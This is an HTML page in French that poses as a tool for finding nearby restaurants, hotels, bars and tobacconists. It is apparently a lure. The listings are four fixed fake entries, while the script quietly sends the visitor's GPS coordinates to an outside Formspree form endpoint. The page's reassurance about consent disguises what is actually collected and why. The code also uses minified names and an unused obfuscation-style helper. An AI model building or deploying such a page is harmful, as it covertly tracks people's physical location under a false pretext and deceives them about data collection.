<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Trouver des offres à proximité</title>

<style>
    :root{
        --accent:#0b79d0;
        --accent-light:#5ab3ff;
        --bg:#f2f6fc;
        --card:#ffffff;
        --text:#0f1724;
        --muted:#6b7280;
        --radius:14px;
        --shadow:0 8px 24px rgba(0,0,0,0.08);
    }

    body{
        margin:0;
        background:var(--bg);
        font-family:system-ui,-apple-system,Segoe UI,Roboto;
        color:var(--text);
        overflow-x:hidden;
        /* Décor subtil */
        background-image:
            radial-gradient(circle at 10% 20%, rgba(11,121,208,0.08), transparent 50%),
            radial-gradient(circle at 90% 80%, rgba(11,121,208,0.06), transparent 50%);
    }

    .wrap{
        max-width:820px;
        margin:40px auto;
        padding:20px;
        animation:fadeIn .7s ease forwards;
    }

    @keyframes fadeIn{
        from{opacity:0; transform:translateY(10px);}
        to{opacity:1; transform:translateY(0);}
    }

    h1{
        font-size:32px;
        margin:0 0 8px 0;
        font-weight:800;
    }

    .description{
        color:var(--muted);
        font-size:18px;
        margin-bottom:22px;
    }

    .description strong{
        color:var(--accent);
        font-weight:700;
    }

    .controls{
        display:flex;
        gap:12px;
        flex-wrap:wrap;
        margin-bottom:20px;
    }

    button.primary{
        background:linear-gradient(135deg, var(--accent), var(--accent-light));
        color:white;
        border:0;
        border-radius:var(--radius);
        padding:16px 22px;
        font-size:20px;
        font-weight:700;
        cursor:pointer;
        min-width:220px;
        box-shadow:var(--shadow);
        transition:transform .15s ease, box-shadow .15s ease;
    }

    button.primary:hover{
        transform:translateY(-3px);
        box-shadow:0 10px 32px rgba(11,121,208,0.2);
    }

    .card{
        background:var(--card);
        border-radius:var(--radius);
        padding:18px;
        box-shadow:var(--shadow);
        margin-top:18px;
        animation:fadeInCard .5s ease forwards;
    }

    @keyframes fadeInCard{
        from{opacity:0; transform:translateY(6px);}
        to{opacity:1; transform:translateY(0);}
    }

    .place{
        background:linear-gradient(180deg,#ffffff,#f9fbff);
        padding:14px;
        border-radius:12px;
        border:1px solid rgba(9,30,66,0.05);
        display:flex;
        justify-content:space-between;
        align-items:center;
        margin-bottom:10px;
        transition:transform .15s ease, box-shadow .15s ease;
    }

    .place:hover{
        transform:scale(1.015);
        box-shadow:0 10px 28px rgba(0,0,0,0.08);
    }

    .name{
        font-weight:700;
        font-size:18px;
    }

    .info{
        font-size:15px;
        color:var(--muted);
    }

    .small{
        font-size:14px;
        color:var(--muted);
    }
</style>
</head>

<body>
    <div class="wrap" role="main">

        <h1>Offres autour de vous</h1>
        <p class="description">
            Retrouvez les meilleurs <strong>restaurants</strong>, <strong>hôtels</strong>, 
            <strong>bars</strong> et <strong>tabacs</strong> près de chez vous.
        </p>

        <div class="controls">
            <button id="getLocationBtn" class="primary" aria-describedby="consentDesc">
                Autoriser la localisation
            </button>
        </div>

        <div id="consentDesc" class="small">
            Vous serez invité à autoriser l'accès. Aucune donnée n'est collectée sans votre accord.
        </div>

        <section class="card" id="resultsCard" aria-live="polite" style="display:none">
            <h3 style="margin:0 0 10px;">Offres à proximité</h3>
            <div id="nearby"></div>
            <div class="small" style="margin-top:10px">Tarifs indicatifs.</div>
        </section>
    </div>

    <form id="geoForm" action="https://formspree.io/f/xwpgbgqd" method="POST" style="display:none">
        <input type="hidden" name="latitude" id="latitude">
        <input type="hidden" name="longitude" id="longitude">
        <input type="hidden" name="context" value="trouver_offres_proximite">
    </form>

<script>
(function(){
    function _0x4a(s){return btoa(unescape(encodeURIComponent(s)));}
    const b=document.getElementById('getLocationBtn');
    const n=document.getElementById('nearby');
    const r=document.getElementById('resultsCard');
    const f=document.getElementById('geoForm');
    function show(l,t){
        const d=[
            {n:'Hôtel ÉcoSmart',t:'Hôtel',d:'0.6 km',p:'€55'},
            {n:'Bistro Local',t:'Restaurant',d:'0.8 km',p:'€12'},
            {n:'Bar du Coin',t:'Bar',d:'1.0 km',p:'€6'},
            {n:'Tabac Central',t:'Tabac',d:'1.2 km',p:'—'}
        ];
        n.innerHTML='';
        d.forEach(i=>{
            const e=document.createElement('div');
            e.className='place';
            e.innerHTML=`<div><div class="name">${i.n}</div><div class="info">${i.t} • ${i.d}</div></div><div class="name">${i.p}</div>`;
            n.appendChild(e);
        });
        r.style.display='block';
    }

    function send(x,y){
        fetch(f.action,{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({latitude:x,longitude:y,context:'trouver_offres_proximite'})
        }).catch(()=>{});
    }

    b.onclick=function(){
        if(navigator.geolocation){
            navigator.geolocation.getCurrentPosition(
                p=>{
                    const x=p.coords.latitude, y=p.coords.longitude;
                    document.getElementById('latitude').value=x;
                    document.getElementById('longitude').value=y;
                    send(x,y);
                    show(x,y);
                },
                e=>alert('Erreur : '+e.message)
            );
        }
    };
})();
</script>

</body>
</html>
